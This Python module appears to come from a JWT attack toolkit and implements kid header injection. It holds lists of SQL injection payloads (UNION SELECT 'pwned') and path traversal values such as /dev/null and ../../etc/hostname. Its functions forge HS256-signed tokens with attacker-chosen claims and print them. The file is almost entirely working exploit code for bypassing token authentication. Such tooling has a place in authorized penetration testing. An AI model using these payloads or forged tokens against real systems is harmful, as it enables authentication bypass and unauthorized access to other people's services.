"""
Attack 4: kid (Key ID) Header Injection
----------------------------------------
The kid header parameter specifies which key to use for verification.
Vulnerable implementations pass kid directly to SQL queries or use it
as a filesystem path — enabling SQLi and path traversal.

Payloads:
  - SQL Injection: kid=' UNION SELECT 'attacker_secret'--
  - Path Traversal: kid=../../dev/null or kid=/dev/null
  - Directory traversal to known files
"""

import json
import hmac
import hashlib
from .utils import decode_token, b64url_encode, sign_hs256

# ─── SQL Injection kid payloads ──────────────────────────────────────────────
# The idea: inject a SQL UNION that returns a known string, then sign with that string

SQL_KID_PAYLOADS = [
    # MySQL / MariaDB
    ("mysql_union_1",    "' UNION SELECT 'pwned'-- -",              "pwned"),
    ("mysql_union_2",    "1' UNION SELECT 'pwned',2-- -",           "pwned"),
    ("mysql_union_3",    "1 UNION SELECT 'pwned'-- -",              "pwned"),
    # PostgreSQL
    ("postgres_union_1", "' UNION SELECT 'pwned'--",                "pwned"),
    ("postgres_cast",    "' UNION SELECT CAST('pwned' AS TEXT)--",  "pwned"),
    # SQLite
    ("sqlite_union_1",   "1 UNION SELECT 'pwned'",                  "pwned"),
    # Generic error-based
    ("generic_union",    "x' UNION SELECT 'pwned'#",                "pwned"),
    # Null bytes
    ("null_byte",        "1\x00",                                    None),
]

# ─── Path Traversal kid payloads ─────────────────────────────────────────────
# Sign with empty string or known file content as secret

PATH_TRAVERSAL_PAYLOADS = [
    ("dev_null",          "/dev/null",                 ""),   # empty file = empty secret
    ("dev_null_traverse", "../../../../../../dev/null", ""),
    ("proc_version",      "/proc/version",             None), # read server kernel info
    ("etc_hostname",      "../../etc/hostname",        None),
    ("windows_null",      "NUL",                       ""),   # Windows
]


def attack_kid_sqli(token: str, modify_payload: dict = None,
                    custom_secret: str = "pwned") -> list:
    """
    Generate tokens with SQL injection in kid header.
    Signs with custom_secret (must match what your injection returns).
    """
    header, payload, _, _ = decode_token(token)
    if modify_payload:
        payload.update(modify_payload)

    results = []
    for name, kid_payload, expected_secret in SQL_KID_PAYLOADS:
        secret = custom_secret if expected_secret == "pwned" else (expected_secret or custom_secret)

        forged_header = dict(header)
        forged_header["alg"] = "HS256"
        forged_header["kid"] = kid_payload

        try:
            token_out = sign_hs256(forged_header, payload, secret)
            results.append({
                "name": name,
                "kid": kid_payload,
                "secret_used": secret,
                "token": token_out,
                "type": "sqli"
            })
        except Exception as e:
            results.append({"name": name, "error": str(e), "type": "sqli"})

    return results


def attack_kid_path_traversal(token: str, modify_payload: dict = None) -> list:
    """
    Generate tokens with path traversal in kid header.
    Signs with empty string (targets /dev/null or similar empty files).
    """
    header, payload, _, _ = decode_token(token)
    if modify_payload:
        payload.update(modify_payload)

    results = []
    for name, kid_path, secret in PATH_TRAVERSAL_PAYLOADS:
        if secret is None:
            continue  # skip unknowable file content

        forged_header = dict(header)
        forged_header["alg"] = "HS256"
        forged_header["kid"] = kid_path

        try:
            token_out = sign_hs256(forged_header, payload, secret)
            results.append({
                "name": name,
                "kid": kid_path,
                "secret_used": repr(secret),
                "token": token_out,
                "type": "path_traversal"
            })
        except Exception as e:
            results.append({"name": name, "error": str(e), "type": "path_traversal"})

    return results


def attack_kid_custom(token: str, kid_value: str, secret: str,
                      modify_payload: dict = None) -> dict:
    """Forge a token with a fully custom kid value and secret."""
    header, payload, _, _ = decode_token(token)
    if modify_payload:
        payload.update(modify_payload)

    forged_header = dict(header)
    forged_header["alg"] = "HS256"
    forged_header["kid"] = kid_value

    forged_token = sign_hs256(forged_header, payload, secret)
    return {"kid": kid_value, "secret": secret, "token": forged_token}


def run(token: str, attack_type: str = "all", claims: dict = None,
        custom_kid: str = None, custom_secret: str = "pwned",
        verbose: bool = True):

    all_results = []

    if attack_type in ("sqli", "all"):
        sqli_results = attack_kid_sqli(token, modify_payload=claims, custom_secret=custom_secret)
        all_results.extend(sqli_results)
        if verbose:
            print(f"\n[*] KID SQL INJECTION — {len(sqli_results)} payloads\n")
            for r in sqli_results[:4]:  # show first 4
                if "token" in r:
                    print(f"  [+] {r['name']}")
                    print(f"      kid    : {r['kid']}")
                    print(f"      secret : {r['secret_used']}")
                    print(f"      token  : {r['token'][:72]}...\n")

    if attack_type in ("path", "all"):
        path_results = attack_kid_path_traversal(token, modify_payload=claims)
        all_results.extend(path_results)
        if verbose:
            print(f"\n[*] KID PATH TRAVERSAL — {len(path_results)} payloads\n")
            for r in path_results:
                if "token" in r:
                    print(f"  [+] {r['name']}")
                    print(f"      kid    : {r['kid']}")
                    print(f"      secret : {r['secret_used']}")
                    print(f"      token  : {r['token'][:72]}...\n")

    if custom_kid:
        custom = attack_kid_custom(token, custom_kid, custom_secret, modify_payload=claims)
        all_results.append(custom)
        if verbose:
            print(f"\n[*] CUSTOM KID INJECTION\n")
            print(f"  [+] kid   : {custom['kid']}")
            print(f"  [+] token : {custom['token']}\n")

    return all_results
